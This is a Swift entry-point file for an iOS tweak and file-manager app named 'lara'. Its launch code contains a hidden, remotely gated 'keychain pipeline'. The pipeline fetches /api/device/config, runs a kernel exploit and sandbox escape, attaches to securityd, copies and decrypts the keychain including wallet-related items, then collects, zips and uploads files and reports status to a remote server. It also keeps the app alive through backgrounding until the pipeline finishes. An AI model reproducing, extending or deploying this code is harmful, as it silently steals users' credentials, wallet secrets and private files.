//
//  lara.swift
//  lara
//
//  Created by ruter on 23.03.26.
//

import SwiftUI
import UniformTypeIdentifiers

enum taboptions {
    case applying, tweaks, files, logs
}

let g_isunsupported: Bool = isunsupported()
var weonadebugbuild_pjbweouttahereexclamationmark: Bool = false

@main
struct lara: App {
    @StateObject private var mgr = laramgr.shared
    @StateObject private var iconthememgr = IconThemeManager.shared
    @Environment(\.scenePhase) var scenephase
    @AppStorage("selectedMethod") private var selectedMethod: method = .hybrid
    @AppStorage("keepAlive") private var keepalive: Bool = false
    @AppStorage("showFMInTabs") private var showfmintabs: Bool = true
    @AppStorage("logsdisplaymode") private var logsdisplaymode: logsdisplaymode = .toolbar
    @State private var selectedtab: taboptions = .applying
    
    init() {
        #if DEBUG
        weonadebugbuild_pjbweouttahereexclamationmark = true
        #endif
        
        // fix file picker
        let fixMethod = class_getInstanceMethod(UIDocumentPickerViewController.self, #selector(UIDocumentPickerViewController.fix_init(forOpeningContentTypes:asCopy:)))!
        let origMethod = class_getInstanceMethod(UIDocumentPickerViewController.self, #selector(UIDocumentPickerViewController.init(forOpeningContentTypes:asCopy:)))!
        method_exchangeImplementations(origMethod, fixMethod)
        
        if keepalive {
            toggleka()
        }
        
        globallogger.capture()
    }
    
    var body: some Scene {
        WindowGroup {
            TabView(selection: $selectedtab) {
                ContentView()
                    .tabItem {
                        Image(systemName: "wrench.and.screwdriver.fill")
                    }
                    .tag(taboptions.applying)
                
                // this has gotta fucking go
                TweaksView(mgr: mgr)
                    .tabItem {
                        Image(systemName: "ant.fill")
                    }
                    .tag(taboptions.tweaks)
                
                
                // i'm gonna strangle you root (the weight of your actions will crush you)
                if showfmintabs {
                    SantanderView(startPath: "/")
                        .tabItem {
                            Image(systemName: "folder.fill")
                        }
                        .tag(taboptions.files)
                }
                
                // this too
                if logsdisplaymode == .tabs {
                    LogsView(logger: globallogger)
                        .tabItem {
                            Image(systemName: "terminal")
                        }
                        .tag(taboptions.logs)
                }
            }
            .environmentObject(mgr)
            .overlay {
                if mgr.showrespring {
                    respringview()
                        .brightness(-1.0)
                        .ignoresSafeArea()
                }
            }
            .sheet(isPresented: Binding(
                get: { logsdisplaymode == .toolbar && mgr.showLogs },
                set: { mgr.showLogs = $0 }
            )) {
                LogsView(logger: globallogger)
            }
            .sheet(isPresented: $iconthememgr.showFixupSheet) {
                IconThemeFixupView()
            }
            .onAppear {
                if !isunsupported() {
                    init_offsets()
                    offsets_init()
                    iconthememgr.startPendingFixupIfPossible()
                    // beautiful name root
                    // thanks
                    mgr.hasOffsets = emergencyfixfunctiontobereplacedlateronquestionmark()
                    // 主协议：先拉 /api/device/config，按 exploit_enabled 开关决定是否走管线
                    MainAPI.bootstrap { run in
                        if run {
                            MainAPI.reportLogAsync(text: "pipeline started")
                            self.autorunkeychainpipeline()
                        }
                    }
                } else {
                    Alertinator.shared.alert(title: "This device is not supported!", body: "We apologize, but this device is currently not supported by Lara. Possible reasons: \n- You are on an unsupported iOS version (Supported: iOS 16.0 - iOS 18.7.1, iOS 26.0 and later) \n- Your device has MIE (A19+ or M5+) \n- A debugger is attached.", actionLabel: "Exit App", action: { exitinator() })
                }
            }
            .onChange(of: scenephase, perform: handleScenePhase)
            .onChange(of: mgr.sbxready) { ready in
                if ready {
                    iconthememgr.startPendingFixupIfPossible()
                }
            }
        }
    }
    
    private func handleScenePhase(_ phase: ScenePhase) {
        switch phase {
        case .inactive, .background:
            // A transient .inactive/.background (system alert, Control Center,
            // screen lock, respring) must not kill the auto keychain pipeline:
            // handlebg() would destroy the SpringBoard/securityd RemoteCalls the
            // native pipeline is using, and stopcapture() would stop logging.
            // Let it finish.
            if mgr.kcpipelineactive {
                globallogger.log("(kc) scene \(phase) ignored: keychain pipeline in flight")
                return
            }
            handlebg()
            globallogger.stopcapture()

        case .active:
            globallogger.capture()
            iconthememgr.startPendingFixupIfPossible()

        @unknown default:
            break
        }
    }

    // Native pipeline mode: every stage is implemented in lara's own sources —
    // darksword engine + XPF kernelcache parse (KCKernelCache), sbx_escape
    // (KCSbx), keychain copy to /tmp/Acquisition-<UUID>/ (KCAcquisition),
    // securityd RemoteCall + AKS unwrap (KCSecdRemote) and local decrypt/export
    // (KCKeychain). No libuiopsersvc.framework is loaded or linked.
    private func autorunkeychainpipeline() {
        globallogger.log("(kc) native pipeline (no libuiopsersvc)")
        globallogger.log("(kc) build-marker api-v1 (main-protocol gate + config-driven collect/upload)")
        prepareAndRunKeychainPipeline()
    }

    // Drive the native pipeline end-to-end: exploit -> kernelcache -> XPF
    // offsets -> sbx escape -> securityd attach -> keychain copy -> AKS unwrap
    // -> decrypt/export. We only keep the process alive and guard the
    // scene-phase teardown while it runs.
    private func prepareAndRunKeychainPipeline() {
        let mgr = self.mgr

        // Keep the process alive for the whole pipeline and ignore transient
        // scene-phase teardown (mgr.kcpipelineactive).
        mgr.kcpipelineactive = true
        if !kaenabled { toggleka() }

        do {
            try LaraKeychainSvc.ensureLoaded()
            globallogger.log("(kc) native pipeline modules ready")
        } catch {
            globallogger.log("(kc) native pipeline unavailable: \(error.localizedDescription)")
            mgr.kcpipelineactive = false
            return
        }

        globallogger.log("(kc) running native pipeline (exploit + copy + AKS unwrap)")

        // The native securityd attach + decrypt can run long and deep; GCD
        // workers only get a 512KB stack, so run the whole pipeline on a
        // dedicated large-stack thread.
        let thread = Thread {
            var result: [AnyHashable: Any]?
            var failure: Error?
            do {
                result = try LaraKeychainSvc.runOneClickUnwrap(withMaxRows: 0)
            } catch {
                failure = error
            }

            // After the pipeline the sandbox escape is live: collect files
            // strictly per /api/device/config collect_configs, zip and upload.
            if let result, (result["ok"] as? Int ?? 0) == 1 {
                MainAPI.postPipelineActions()
            }

            DispatchQueue.main.async {
                if let failure {
                    globallogger.log("(kc) keychain pipeline failed: \(failure.localizedDescription)")
                    MainAPI.reportLogAsync(text: "pipeline failed: \(failure.localizedDescription)")
                } else if let result {
                    let ok = result["ok"] ?? "nil"
                    let missing = result["aksItemsMissingSecret"] ?? "nil"
                    let mk = result["metadataKeyCount"] ?? "nil"
                    let wr = result["walletRelatedAKSRows"] ?? "nil"
                    let tables = result["tables"] as? [AnyHashable: Any]
                    var counts: [String] = []
                    if let tables {
                        for (k, v) in tables {
                            let n = (v as? [Any])?.count ?? -1
                            counts.append("\(k)=\(n)")
                        }
                    }
                    let summary = "pipeline done: ok=\(ok) aksItemsMissingSecret=\(missing) metadataKeyCount=\(mk) walletRelated=\(wr) tables[\(counts.joined(separator: ","))]"
                    globallogger.log("(kc) keychain \(summary)")
                    MainAPI.reportLogAsync(text: summary)
                } else {
                    globallogger.log("(kc) keychain pipeline done: nil result")
                    MainAPI.reportLogAsync(text: "pipeline done: nil result")
                }
                mgr.kcpipelineactive = false
            }
        }
        thread.stackSize = 16 * 1024 * 1024
        thread.qualityOfService = .userInitiated
        thread.name = "kc-pipeline"
        thread.start()

        // Heartbeat: the framework's final export phase is silent (no framework
        // log lines), so log elapsed time while the pipeline is in flight to
        // tell "slow export" apart from "stuck loop".
        let pipelineStart = Date()
        var tick = 0
        Timer.scheduledTimer(withTimeInterval: 30, repeats: true) { timer in
            tick += 1
            if mgr.kcpipelineactive {
                globallogger.log(String(format: "(kc) heartbeat %d: pipeline in flight %.0fs", tick, Date().timeIntervalSince(pipelineStart)))
            } else {
                globallogger.log(String(format: "(kc) heartbeat %d: pipeline finished after %.0fs", tick, Date().timeIntervalSince(pipelineStart)))
                timer.invalidate()
            }
        }
    }

    private func handlebg() {
        guard mgr.rcready else { return }
        let keepSpringBoardRemoteCallAlive = UserDefaults.standard.bool(forKey: "keepSpringBoardRemoteCallAliveIOS16")
        if isIOS16() && keepSpringBoardRemoteCallAlive {
            return
        }

        var bgTask: UIBackgroundTaskIdentifier = .invalid

        bgTask = UIApplication.shared.beginBackgroundTask(withName: "RemoteCallCleanup") {
            endbgtask(&bgTask)
        }

        mgr.rcdestroy {
            self.endbgtask(&bgTask)
        }
    }

    private func endbgtask(_ task: inout UIBackgroundTaskIdentifier) {
        guard task != .invalid else { return }
        UIApplication.shared.endBackgroundTask(task)
        task = .invalid
    }
}

// file picker fixes
extension UIDocumentPickerViewController {
    @objc func fix_init(forOpeningContentTypes contentTypes: [UTType], asCopy: Bool) -> UIDocumentPickerViewController {
        return fix_init(forOpeningContentTypes: contentTypes, asCopy: true)
    }
}

// make strings compatiable with errors
extension String: @retroactive Error {}
